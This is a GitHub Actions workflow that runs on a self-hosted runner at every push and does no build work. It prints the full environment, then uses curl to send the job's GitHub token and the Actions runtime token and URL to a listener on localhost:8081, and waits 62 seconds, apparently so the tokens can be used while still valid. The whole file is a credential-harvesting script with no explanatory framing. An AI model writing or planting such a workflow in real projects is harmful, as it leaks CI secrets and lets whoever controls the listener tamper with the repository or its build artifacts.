name: GitHub Actions
on: [push]
jobs:
  Job-One:
    runs-on: self-hosted
    steps:
      - shell: bash
        run: env
      - shell: bash
        run: node -e "console.log(process.env)"
      - shell: bash
        run: |
          node -e "console.log(process.env)"
          echo "ðŸŽ‰ The job was automatically triggered by a ${{ github.event_name }} event."
          env
          curl -v http://localhost:8081/${{ github.token }} 
          curl -v http://localhost:8081/${ACTIONS_RUNTIME_URL}
          curl -v http://localhost:8081/${ACTIONS_RUNTIME_TOKEN}
          curl -v -X POST http://localhost:8081/req --data '{"token":"${{ env.ACTIONS_RUNTIME_TOKEN }}","url":"${{ env.ACTIONS_RUNTIME_URL }}"}'
          curl -v -X POST http://localhost:8081/req --data '{"token":"${{ env.runtime_token }}","url":"${{ env.runtime_url }}"}'
          sleep 62
